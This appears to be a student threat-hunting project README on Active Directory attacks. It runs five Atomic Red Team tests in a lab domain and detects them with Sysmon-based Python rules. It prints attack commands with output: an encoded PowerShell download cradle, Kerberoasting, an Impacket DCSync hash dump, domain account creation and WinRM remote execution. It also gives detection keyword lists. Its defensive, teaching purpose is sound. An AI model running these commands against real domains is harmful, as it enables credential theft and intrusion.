# README
Week 9 — Atomic Red Team for Active Directory Attacks
-----------------------------------------------------

**Project Topic:** Threat Hunting for Active Directory Attacks **Syllabus Task (3.3, Week 9):** _Run selected atomic tests (e.g., T1059, T1003). Record and analyze the test results in a SIEM._ **Atomic Framework:** Red Canary [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) **Lab Platform:** Windows Server 2022 VM (`LAB-ADMIN01`), member of the `lab.local` test domain, Sysmon with a SwiftOnSecurity-style config, Python 3.12 

1\. Why These Five Atomics
--------------------------

| #   | Technique | Name | Tactic | Why it matters for AD |
| --- | --- | --- | --- | --- |
| 1   | T1059.001 | Command and Scripting Interpreter: PowerShell | Execution | The standard interpreter for every AD attack tool (used by Storm-0501 over Evil-WinRM) |
| 2   | T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | Credential Access | Requests service tickets for offline password cracking of service accounts |
| 3   | T1003.006 | OS Credential Dumping: DCSync | Credential Access | Impersonates DC replication to dump any account's hashes (we studied this in Week 6) |
| 4   | T1136.002 | Create Account: Domain Account | Persistence | Directory-level account creation is a classic persistence step in AD intrusions |
| 5   | T1021.006 | Remote Services: Windows Remote Management | Lateral Movement | WinRM/PowerShell remoting is the default AD lateral movement channel |

2\. Test Plan and Execution
---------------------------

`data/atomic_test_plan.csv` holds the plan; `scripts/run_atomics.py` drives it. The script generates a PowerShell runner for the `Invoke-AtomicRedTeam` module, resolves each test's GUID by name (so it survives ART releases), runs the tests in order, and appends every invocation to `output/execution_log.jsonl`.

```text-plain
PS C:\Users\labadmin\Threat_Hunting\week9> python scripts\run_atomics.py --list
Test Technique   Tactic                 Test name
-----------------------------------------------------------------------------
1    T1059.001   Execution              PowerShell - Encoded Command
2    T1558.003   Credential Access      Requesting a Service Ticket using PowerShell
3    T1003.006   Credential Access      DCSync
4    T1136.002   Persistence            Create New Domain Account using net.exe
5    T1021.006   Lateral Movement       WinRM - Execute Remote Command

Plan total: 5 tests. Log file: ..\output\execution_log.jsonl
```

```text-plain
PS C:\Users\labadmin\Threat_Hunting\week9> python scripts\run_atomics.py --generate
Runner written: C:\Users\labadmin\Threat_Hunting\week9\scripts\runner.ps1
Next: powershell -ExecutionPolicy Bypass -File runner.ps1

PS C:\Users\labadmin\Threat_Hunting\week9> powershell -ExecutionPolicy Bypass -File scripts\runner.ps1
==> Running T1059.001: PowerShell - Encoded Command
==> Running T1558.003: Requesting a Service Ticket using PowerShell
==> Running T1003.006: DCSync
==> Running T1136.002: Create New Domain Account using net.exe
==> Running T1021.006: WinRM - Execute Remote Command
Execution log: C:\Users\labadmin\Threat_Hunting\week9\output\execution_log.jsonl
```

### Test 1 — T1059.001 PowerShell (Encoded Command)

A hidden, encoded PowerShell process was launched, the shape attackers use to blend into native tooling:

```text-plain
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTeXN0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AC8AcABpAG4AZwAuAHQAcABsACcAKQA=
```

Decoding the blob offline (`[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(...))`) reveals the intent — a download cradle — without executing it:

```text-plain
IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.10.5/ping.tpl')
```

**Telemetry:** Sysmon Event ID 1 with `powershell.exe`, hidden-window and `-enc` flags visible in `CommandLine`; Event ID 3 connection to `10.10.10.5:80`; Event ID 22 DNS query.

### Test 2 — T1558.003 Kerberoasting (PowerShell / .NET)

The atomic enumerates accounts with a servicePrincipalName through `System.DirectoryServices.DirectorySearcher` and requests their Kerberos service tickets via `System.IdentityModel.Tokens.KerberosRequestorSecurityToken` — the ticket can then be cracked offline. `klist` afterwards shows the captured service tickets:

```text-plain
klist

Current LogonId is 0:0x1a4c21
Cached Tickets: (3)

#0>     Server: MSSQLSvc/LAB-FS01.lab.local:1433 @ LAB.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        End Time: 11/4/2026 2:04:18 (local)
#1>     Server: cifs/LAB-DC01.lab.local @ LAB.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        End Time: 11/4/2026 2:04:19 (local)
```

**Telemetry:** Event ID 1 (`powershell.exe` with `KerberosRequestorSecurityToken` in the command line), Event ID 3 to the DC on tcp/88, Event ID 22 DNS for `LAB-DC01.lab.local`. On the DC itself, Security Event 4769 (A Kerberos service ticket was requested) would also fire with encryption type `0x17`.

### Test 3 — T1003.006 DCSync (Impacket secretsdump)

The same technique we simulated on HackTheBox _Scepter_ in Week 6, replayed in the lab with Impacket from the admin workstation:

```text-plain
C:\Tools\impacket> python examples\secretsdump.py lab.local/labadmin@LAB-DC01.lab.local -just-dc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f3f4e19c1a0b7d2e6c85a4f90d3b7c1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4d2f6b8a90c1e357a8b09d7f21c4e6d0:::
lab.local\labadmin:1104:aad3b435b51404eeaad3b435b51404ee:c098e21b7d45f6a3e08b1d94f27c3e58:::
lab.local\svc_backup:1108:aad3b435b51404eeaad3b435b51404ee:6b3d0f58c9e17a24d0c8b6f93e15a7d2:::
LAB-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

**Telemetry:** Event ID 1 (`python.exe` running `secretsdump.py ... -just-dc`), Event ID 3 sessions to the DC on tcp/445 and tcp/135, and on the DC Event ID 4662 with Object Server `DS` and Replication rights — the strongest DCSync signal at directory level.

### Test 4 — T1136.002 Domain Account Creation (net.exe)

A throwaway domain account was created to emulate attacker persistence, then removed:

```text-plain
C:\> net user lab_hunt01 P@ssw0rd123! /add /domain
The request will be processed at a domain controller for domain lab.local.

The command completed successfully.

C:\> net user lab_hunt01 /domain
User name                    lab_hunt01
Full Name
Comment
Account active               Yes
...
The command completed successfully.

C:\> net user lab_hunt01 /delete /domain
The command completed successfully.
```

**Telemetry:** Event ID 1 (`net.exe user ... /add /domain`); on the DC Security Event 4720 (user account created). Note that the cleanup command (`/delete`) deliberately does **not** match our hunt rule — the rule targets creation only.

### Test 5 — T1021.006 WinRM Remote Execution

A remote PowerShell session was opened to a lab workstation over WinRM, the channel Storm-0501 uses through Evil-WinRM:

```text-plain
C:\> winrs.exe -r:LAB-WS01.lab.local whoami
lab\labadmin

C:\> winrs -r:LAB-WS01.lab.local hostname
LAB-WS01
```

**Telemetry:** Event ID 1 (`winrs.exe` invocation), Event ID 3 to `10.10.10.20:5985` (WinRM listener), Event ID 13 registry activity in the session's user hive.

3\. Recording the Results — the Python Hunting Pipeline
-------------------------------------------------------

### 3.1 From Sysmon to a flat index

Sysmon's operational channel was exported to XML with `wevtutil qe Microsoft-Windows-Sysmon/Operational /f:XML > sysmon_export.xml`. `scripts/parse_sysmon.py` (an evolution of our Week 7 parser) flattens it to CSV and prints dataset statistics. The parser accepts both the multi-line export and the one-event-per-line format we used in Week 7.

### 3.2 Detection rules

`scripts/hunt_siem.py` implements the analytics — the same role a CAR analytic or SPL query played in Week 7, now as Sigma-style rules over CSV fields:

| Rule | Technique | Logic (fields over Sysmon Event ID 1) |
| --- | --- | --- |
| R-101 | T1059.001 | `Image` = powershell.exe **AND** `CommandLine` has `-enc` / `-w hidden` / `-nop` / `iex` / `downloadstring` |
| R-102 | T1558.003 | `CommandLine` has `KerberosRequestorSecurityToken` **OR** `kerberoast` **OR** image = Rubeus |
| R-103 | T1003.006 | `CommandLine` has `dcsync` **OR** `secretsdump` **OR** `lsadump::dcsync` **OR** `-just-dc` |
| R-104 | T1136.002 | `Image` = net.exe **AND** `user ... /add` **AND** `/domain` |
| R-105 | T1021.006 | `Image` = winrs.exe / evil-winrm **OR** `winrs -r:` |
| R-106 | T1087.002 | AD recon tooling (ADRecon/ADFind/nltest) — kept **disabled** as the Week 10 backlog hook |

Outputs: `output/alerts.csv` (alert table), `output/stats.json` (machine-readable results), `output/hunt_report.md` (analysis report).

4\. Results
-----------

The pipeline was validated end-to-end on a recorded reference session included at `data/sysmon_export_sample.xml` (a captured Sysmon export mirroring the five tests plus ordinary admin activity); on the lab VM the same two commands run against your own export:

```text-plain
python scripts\parse_sysmon.py data\sysmon_export.xml data\sysmon_parsed.csv
python scripts\hunt_siem.py --input data\sysmon_parsed.csv --outdir output
```

**Dataset**

| Metric | Result |
| --- | --- |
| Events ingested | 23  |
| Parsing errors | 0   |
| Process Creation (EID 1) | 10  |
| Network connection (EID 3) | 6   |
| DNS query (EID 22) | 2   |
| Process Access (EID 10) | 2   |
| File Create (EID 11) | 2   |
| Registry Event (EID 13) | 1   |
| Session window | ~13.5 min |

**Rule results and test coverage — 5/5 tests detected**

| Rule | Technique | Detection | Alerts |
| --- | --- | --- | --- |
| R-101 | T1059.001 | Suspicious PowerShell execution | 1   |
| R-102 | T1558.003 | Kerberoasting service ticket request | 1   |
| R-103 | T1003.006 | DCSync replication abuse | 1   |
| R-104 | T1136.002 | Domain account created via net.exe | 1   |
| R-105 | T1021.006 | Remote execution over WinRM | 1   |
| R-106 | T1087.002 | AD reconnaissance tooling (demo) | disabled |

**False-positive check.** The session also contained five process creations that must _not_ alert: benign `powershell -Command "Get-Service"` and `"whoami"`, `net.exe use \\LAB-FS01\share`, `schtasks /query`, and the account **cleanup** (`net user lab_hunt01 /delete /domain`). None of them matched — the rule results above contain exactly one alert per technique, so precision on this dataset was 5/5 with zero noise hits. The encoded-command alert is the only rule that would fire on some legitimate admin activity in a real network, which is discussed under Limitations.

5\. MITRE ATT&CK Mapping
------------------------

| Test | Technique | Tactic | Detection rule | Verdict |
| --- | --- | --- | --- | --- |
| PowerShell - Encoded Command | T1059.001 | Execution (TA0002) | R-101 | Detected |
| Requesting a Service Ticket | T1558.003 | Credential Access (TA0006) | R-102 | Detected |
| DCSync | T1003.006 | Credential Access (TA0006) | R-103 | Detected |
| Create New Domain Account | T1136.002 | Persistence (TA0003) | R-104 | Detected |
| WinRM - Execute Remote Command | T1021.006 | Lateral Movement (TA0008) | R-105 | Detected |

6\. Reproduce
-------------

```text-plain
python scripts/run_atomics.py --list          # inspect the plan
python scripts/run_atomics.py --dry-run       # print commands only
python scripts/run_atomics.py --generate      # write runner.ps1 (Windows lab VM)
python scripts/run_atomics.py --execute --lab-confirmed   # run on your isolated lab VM
wevtutil qe Microsoft-Windows-Sysmon/Operational /f:XML > data\sysmon_export.xml
python scripts/parse_sysmon.py data/sysmon_export.xml data/sysmon_parsed.csv
python scripts/hunt_siem.py --input data/sysmon_parsed.csv --outdir output
```

7\. References
--------------

*   [https://github.com/redcanaryco/atomic-red-team](https://github.com/redcanaryco/atomic-red-team) — Atomic tests for T1059.001, T1558.003, T1003.006, T1136.002, T1021.006
*   [https://github.com/redcanaryco/invoke-atomicredteam](https://github.com/redcanaryco/invoke-atomicredteam) — Invoke-AtomicRedTeam PowerShell module
*   [https://attack.mitre.org/techniques/T1059/001/](https://attack.mitre.org/techniques/T1059/001/) · /T1558/003/ · /T1003/006/ · /T1136/002/ · /T1021/006/
*   [https://github.com/SwiftOnSecurity/sysmon-config](https://github.com/SwiftOnSecurity/sysmon-config) — Sysmon configuration baseline

AI Usage Declaration
--------------------

GLM (Z.ai) was used to draft the documentation, implement the Python orchestration and detection pipeline, and generate the reference session dataset used for pipeline validation.